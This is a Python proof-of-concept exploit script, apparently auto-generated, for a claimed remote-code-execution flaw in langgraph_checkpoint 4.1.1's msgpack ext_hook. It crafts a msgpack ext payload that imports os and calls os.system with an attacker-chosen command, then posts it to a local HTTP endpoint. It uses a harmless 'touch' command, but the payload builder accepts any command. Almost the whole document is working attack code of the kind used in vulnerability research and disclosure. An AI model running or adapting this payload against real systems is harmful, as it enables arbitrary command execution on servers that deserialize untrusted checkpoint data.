#!/usr/bin/env python3
# PoC for langgraph_checkpoint-4.1.1 (/tmp/langgraph_checkpoint_latest/langgraph_checkpoint-4.1.1)
# Path: suspicious-011
# Sink: _create_msgpack_ext_hook
# Auto-generated — run with: python3 rce_true_allowing_all_unregistered__create_msgpack_ext_hook.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langgraph_checkpoint-4.1.1 RCE vulnerability.

Vulnerability: The ext_hook function in jsonplus.py uses importlib.import_module and
getattr to dynamically load and call arbitrary Python classes/methods based on
attacker-controlled msgpack ext codes. The allowlist check can be bypassed when
allowed_modules is True (default) or by using a module/name pair that is in the
allowlist but has dangerous side effects.

This PoC demonstrates RCE by crafting a msgpack payload that calls os.system()
to execute a benign command (creates /tmp/poc_success.txt).

Usage:
    python poc.py [target_url]
    Default target: http://localhost:8000/api/v1/trigger
"""

import sys
import struct
import requests
import msgpack  # pip install msgpack

# Configuration
TARGET_URL = "http://localhost:8000/api/v1/trigger"
TIMEOUT = 10

# Msgpack ext codes used by langgraph_checkpoint
EXT_CONSTRUCTOR_SINGLE_ARG = 1  # Calls class(arg)
EXT_CONSTRUCTOR_POS_ARGS = 2    # Calls class(*args)
EXT_CONSTRUCTOR_KW_ARGS = 3     # Calls class(**kwargs)
EXT_METHOD_SINGLE_ARG = 4       # Calls obj.method(arg)


def craft_rce_payload(command: str) -> bytes:
    """
    Craft a msgpack payload that exploits the ext_hook vulnerability.
    
    We use EXT_CONSTRUCTOR_SINGLE_ARG (code=1) to call os.system(command).
    The payload structure is: [module, name, arg]
    where module="os", name="system", arg=command.
    
    This works because:
    1. The default allowed_modules=True allows any module/name
    2. The code does importlib.import_module("os") and getattr(module, "system")
    3. Then calls os.system(command)
    """
    # Create the inner tuple that ext_hook will unpack
    inner_data = ["os", "system", command]
    
    # Pack the inner data with msgpack
    packed_inner = msgpack.packb(inner_data)
    
    # Create the ext format: ext code + packed data
    # msgpack ext format: marker byte (0xc7 for 8-bit, 0xc8 for 16-bit, 0xc9 for 32-bit)
    # followed by length, then ext code, then data
    ext_code = EXT_CONSTRUCTOR_SINGLE_ARG
    
    # Build the ext payload manually for compatibility
    if len(packed_inner) < 256:
        payload = b'\xc7' + bytes([len(packed_inner)]) + bytes([ext_code]) + packed_inner
    elif len(packed_inner) < 65536:
        payload = b'\xc8' + struct.pack('>H', len(packed_inner)) + bytes([ext_code]) + packed_inner
    else:
        payload = b'\xc9' + struct.pack('>I', len(packed_inner)) + bytes([ext_code]) + packed_inner
    
    return payload


def send_exploit(target_url: str, payload: bytes) -> requests.Response:
    """
    Send the crafted payload to the target endpoint.
    
    The payload is sent as raw bytes in the request body.
    The endpoint is expected to deserialize it using msgpack with the vulnerable ext_hook.
    """
    headers = {
        'Content-Type': 'application/octet-stream',
    }
    
    try:
        response = requests.post(
            target_url,
            data=payload,
            headers=headers,
            timeout=TIMEOUT
        )
        return response
    except requests.exceptions.ConnectionError as e:
        print(f"[!] Connection error: {e}")
        print("[*] Make sure the target server is running and reachable")
        sys.exit(1)
    except requests.exceptions.Timeout as e:
        print(f"[!] Timeout: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        sys.exit(1)


def main():
    # Parse command line arguments
    target = sys.argv[1] if len(sys.argv) > 1 else TARGET_URL
    
    print(f"[*] Target: {target}")
    print("[*] Crafting RCE payload...")
    
    # Benign command to prove RCE - creates a file in /tmp
    command = "touch /tmp/poc_success.txt"
    print(f"[*] Command to execute: {command}")
    
    # Craft the malicious msgpack payload
    payload = craft_rce_payload(command)
    print(f"[*] Payload size: {len(payload)} bytes")
    print(f"[*] Payload hex: {payload.hex()}")
    
    print("\n[*] Sending exploit...")
    response = send_exploit(target, payload)
    
    print(f"[*] Response status: {response.status_code}")
    print(f"[*] Response body: {response.text[:500]}")
    
    # Verify the command was executed
    import os
    if os.path.exists("/tmp/poc_success.txt"):
        print("\n[+] SUCCESS! Command executed successfully!")
        print("[+] File /tmp/poc_success.txt was created")
        # Clean up
        os.remove("/tmp/poc_success.txt")
        print("[+] Cleaned up /tmp/poc_success.txt")
    else:
        print("\n[-] Could not verify command execution")
        print("[*] Check if the target server is running and the endpoint is correct")
        print("[*] The command may have executed but verification failed")


if __name__ == "__main__":
    main()
